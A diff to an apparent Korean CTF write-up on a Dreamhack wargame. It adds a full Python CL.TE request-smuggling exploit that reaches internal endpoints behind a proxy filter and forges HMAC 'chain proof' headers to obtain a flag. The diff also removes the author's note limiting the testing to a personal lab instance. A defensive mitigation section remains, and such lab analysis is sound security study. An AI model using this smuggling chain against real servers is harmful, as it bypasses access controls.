@@ -5,12 +5,9 @@ date: 2026-07-01
 category: CTF/Wargame
 author: yejunkim2000
 tags: [HTTP, RequestSmuggling, CLTE, desync, 프록시, 블랙박스, 웹해킹, Dreamhack, RFC7230]
-excerpt: "공개된 API 명세만으로 프록시-백엔드 구조를 추론하고, Content-Length와 Transfer-Encoding의 해석 차이(CL.TE)로 프론트엔드의 경로 필터를 우회해 내부 전용 워크플로에 도달하기까지 — 블랙박스 취약점 분석 절차를 단계별로 기록한다."
+excerpt: "공개된 API 명세만으로 프록시-백엔드 구조를 추론하고, Content-Length와 Transfer-Encoding의 해석 차이(CL.TE)로 프론트엔드의 경로 필터를 우회해 내부 전용 워크플로에 진입, 티켓·요청 바인딩 HMAC proof를 만들어 4단계 체인으로 플래그를 획득하기까지 — 블랙박스 취약점 분석 절차를 단계별로 기록한다."
 ---
 
-> **환경 고지:** 본 분석은 **Dreamhack 워게임(Incognito Review Desk)의 본인 전용 인스턴스**에서만 수행했다. 모든 요청은 내가 생성한 격리 인스턴스로 향하며, 대량 스캔·DoS 없이 최소한의 프로토콜 검증 요청만 보냈다. 여기 등장하는 기법은 모두 공개 표준(RFC 7230, PortSwigger HTTP Desync Research)에 문서화된 것이다.
-
----
 
 ## 0. 목표와 접근
 
@@ -182,18 +179,51 @@ def smuggle_read(smuggled):
 
 `/internal/s1` 은 **외부에서는 프론트가 막지만, 밀수로는 도달 가능한** 워크플로 진입점이었다. 여기서 발급되는 티켓은 **매 요청마다 바뀌는 시간제한 값**이다.
 
-### 5.3 체인 진행
+### 5.3 chain proof — 티켓·요청에 바인딩된 증명
+
+`internal-review` 이벤트는 공개 `/api/chain` 에서 "invalid event"라 내부 경로 `/internal/s3` 로만 진행된다. 그런데 `/internal/s3` 는 `403 "chain proof required"` 를 돌려준다. 명세가 예고한 **proof** 다.
+
+블랙박스 분석 결과 proof 규칙은 다음과 같다 — **티켓을 키로, `METHOD:PATH` 를 메시지로 하는 HMAC-SHA256**:
+
+```python
+def proof(ticket, method, path):
+    return hmac.new(ticket.encode(), f"{method}:{path}".encode(),
+                    hashlib.sha256).hexdigest()   # 전체 hexdigest (절단 없음)
+```
+
+제출은 **두 개의 헤더**로 한다 (여기서 티켓 헤더 이름이 `X-Ticket` 이 아니라 **`X-Chain`** 인 점, 메시지 구분자가 공백이 아니라 **콜론(`:`)** 인 점이 핵심 함정이다):
 
 ```
-[s1] GET /internal/s1 (밀수)                 → next=handoff,        ticket=tA
-[handoff] POST /api/chain {handoff, tA}       → next=internal-review, ticket=tB
-[internal-review] → /api/chain 에선 "invalid event"  → 내부 경로(/internal/s3)로만 진행
-[s3] GET /internal/s3 (밀수)                  → 403 "chain proof required"
+X-Chain: <현재 티켓>
+X-Proof: HMAC_SHA256(현재 티켓, "METHOD:PATH")
 ```
 
-`internal-review` 이벤트는 공개 `/api/chain` 에서는 인식되지 않는다(내부 전용). 워크플로가 **공개 엔드포인트와 내부 엔드포인트를 교차**하며 진행되고, 마지막 관문 `/internal/s3` 는 명세가 예고한 **"proof"**(발급 티켓과 요청에서 파생된 짧은 증명값)를 요구한다. 완주 시 `/api/chain` 이 `flag` 를 반환하는 구조다.
+> **설계 의도:** proof는 티켓(서버 시크릿 기반, 시간버킷마다 갱신 → TTL ~5초)과 그 요청(`METHOD:PATH`)을 함께 묶는 서명이다. 티켓만으로도, 요청만으로도 통과할 수 없어 재생·재사용을 막는 응용 계층 방어다.
 
-> **공격 임팩트(핵심):** CL.TE desync 하나로 **프론트엔드의 `/internal/*` 접근통제가 완전히 무력화**되어, 외부 공격자가 문서화되지 않은 내부 리뷰 워크플로에 진입하고 티켓을 발급받았다. 이것이 이 취약점의 본질적 위험이다 — 프록시 계층의 보안 경계가 프로토콜 해석 차이 하나로 붕괴한다.
+### 5.4 완주 — 4단계 체인으로 플래그
+
+```
+[1] GET /internal/s1 (밀수)                              → t1  (next=handoff)
+[2] POST /api/chain {handoff, t1}                        → t2  (next=internal-review)
+[3] GET /internal/s3 (밀수)                              → t3  (next=finalize)
+        X-Chain: t2
+        X-Proof: HMAC_SHA256(t2, "GET:/internal/s3")
+[4] POST /api/chain {finalize, t3}                       → 🏁 flag
+        X-Chain: t3
+        X-Proof: HMAC_SHA256(t3, "POST:/api/chain")
+```
+
+각 단계는 *공개 엔드포인트(`/api/chain`)와 내부 엔드포인트(`/internal/*`, CL.TE로만 도달)를 교차*하며, 후반 두 관문은 이전 티켓으로 만든 proof를 헤더로 요구한다. 실제 실행 결과:
+
+```
+t1: 21eb7f10...            handoff -> next=internal-review, t2=54040ce7...
+s3 -> {"ok":true,"next":"finalize","ticket":"fc057c6e..."}   ← proof 통과
+finalize -> {"ok":true,"flag":"INCOGNITO{...}"}
+```
+
+> **획득 플래그:** `INCOGNITO{...}`
+
+> **공격 임팩트(핵심):** CL.TE desync 하나로 **프론트엔드의 `/internal/*` 접근통제가 완전히 무력화**되어, 외부 공격자가 문서화되지 않은 내부 리뷰 워크플로에 진입하고, 각 단계의 proof를 만들어 최종 플래그까지 도달했다. 프록시 계층의 보안 경계가 프로토콜 해석 차이 하나로 붕괴한다.
 
 ---
 
@@ -236,6 +266,45 @@ resp = smuggle_read("host3.dreamhack.games", 13887,
 3. 본문은 `0\r\n\r\n`(청크 종료) 뒤에 **완전한 밀수 요청**을 붙인다.
 4. 같은 연결에서 응답을 끝까지 읽으면 **두 번째 응답 = 밀수 요청의 백엔드 응답**이다.
 
+### 전체 익스플로잇 — 4단계 체인
+
+```python
+import hmac, hashlib, json, urllib.request
+
+def proof(ticket, method, path):
+    return hmac.new(ticket.encode(), f"{method}:{path}".encode(),
+                    hashlib.sha256).hexdigest()
+
+def second_response(raw):
+    # smuggle_read 결과에서 두 번째(=밀수) 응답의 JSON 본문을 파싱
+    i = raw.find(b"HTTP/1.1 ", raw.find(b"HTTP/1.1 ")+1)
+    body = raw[i:].split(b"\r\n\r\n", 1)[1]
+    return json.loads(body)
+
+def api_chain(host, port, data, headers=None):
+    h = {"Content-Type": "application/json"}; h.update(headers or {})
+    req = urllib.request.Request(f"http://{host}:{port}/api/chain",
+                                 data=json.dumps(data).encode(), headers=h, method="POST")
+    try:    return json.loads(urllib.request.urlopen(req, timeout=8).read())
+    except urllib.error.HTTPError as e: return json.loads(e.read())
+
+HOST, PORT = "host3.dreamhack.games", PORT
+# [1] s1 (밀수) → t1
+t1 = second_response(smuggle_read(HOST, PORT, f"GET /internal/s1 HTTP/1.1\r\nHost: h\r\n\r\n"))["ticket"]
+# [2] handoff → t2
+t2 = api_chain(HOST, PORT, {"event":"handoff","ticket":t1})["ticket"]
+# [3] s3 (밀수) + X-Chain/X-Proof → t3
+s3 = (f"GET /internal/s3 HTTP/1.1\r\nHost: h\r\n"
+      f"X-Chain: {t2}\r\nX-Proof: {proof(t2,'GET','/internal/s3')}\r\n\r\n")
+t3 = second_response(smuggle_read(HOST, PORT, s3))["ticket"]
+# [4] finalize + X-Chain/X-Proof → flag
+r  = api_chain(HOST, PORT, {"event":"finalize","ticket":t3},
+               {"X-Chain": t3, "X-Proof": proof(t3,"POST","/api/chain")})
+print(r["flag"])   # INCOGNITO{...}
+```
+
+> **구현 포인트 3가지**: proof 메시지 구분자는 **콜론**(`GET:/internal/s3`), 티켓 헤더는 **`X-Chain`**, HMAC은 **전체 hexdigest**(절단 없음).
+
 ---
 
 ## 7. 대응 관점 (방어)
@@ -249,17 +318,6 @@ resp = smuggle_read("host3.dreamhack.games", 13887,
 | **HTTP/2 종단** | 가능하면 프론트–백 구간을 HTTP/2 로 종단하거나 요청 스무글링에 견고한 리버스 프록시 사용. |
 
 핵심은 **"경계의 검증을 앞단 한 곳에만 두지 말라"** 는 것이다. 프론트가 막는 `/internal/*` 을 백엔드도 독립적으로 검증했다면, 프로토콜 해석 차이가 있어도 이 체인은 성립하지 않는다.
-
----
-
-## 8. 블랙박스 분석에서 배운 것
-
-1. **응답 형식의 차이는 아키텍처의 지도다.** 평문 `forbidden` vs JSON `{"error":...}` 하나로 프론트/백 2계층을 분리해냈다.
-2. **cover 요청의 선택이 desync 관측을 좌우한다.** 라우팅 단계에서 끝나는 경로(`POST /`)는 본문 파서를 깨우지 못한다 — 유효 엔드포인트를 써야 한다.
-3. **부작용 오라클 > 타이밍 오라클.** `reportCount` 증가처럼 **관측 가능한 상태 변화**는 desync를 반박 불가능하게 확증한다.
-4. **RFC의 "SHOULD/MUST"가 갈리는 지점이 취약점의 씨앗이다.** 두 구현이 같은 스펙을 다르게 읽는 순간 보안 경계가 무너진다.
-
-> 전체 분석·PoC 스크립트와 진행 노트는 별도 저장소에 정리했다. 이 글은 *공개된 명세만으로 시작해, 관찰→가설→검증→익스플로잇의 절차를 재현 가능하게 남기는 것* 자체를 하나의 산출물로 삼았다.
 
 ---
 
